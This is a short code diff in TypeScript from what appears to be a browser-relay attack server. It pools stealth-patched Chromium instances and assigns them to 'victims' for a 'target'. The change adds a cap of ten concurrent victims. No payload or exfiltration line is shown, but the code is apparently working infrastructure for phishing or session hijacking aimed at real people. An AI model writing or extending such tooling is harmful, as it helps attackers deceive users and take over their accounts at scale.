@@ -14,6 +14,10 @@ const USER_DATA_ROOT = join(__dirname, '..', 'user_data');
 
 chromium.use(StealthPlugin());
 
+// ─── Constants ────────────────────────────────────────────────────────────────
+
+export const MAX_CONCURRENT_VICTIMS = 10;
+
 // ─── State ────────────────────────────────────────────────────────────────────
 
 const pool = new Map<string, BrowserInstance>();
@@ -49,6 +53,12 @@ export async function claimInstance(
   victimHeight: number,
   target: Target,
 ): Promise<BrowserInstance> {
+  // Check concurrent victim limit
+  const activeVictims = [...pool.values()].filter(i => i.claimed && i.victimSocket !== null).length;
+  if (activeVictims >= MAX_CONCURRENT_VICTIMS) {
+    throw new Error(`Server at capacity: ${MAX_CONCURRENT_VICTIMS} concurrent victims maximum`);
+  }
+
   // Grab warm instance
   const instance = warmInstance;
   warmInstance = null;
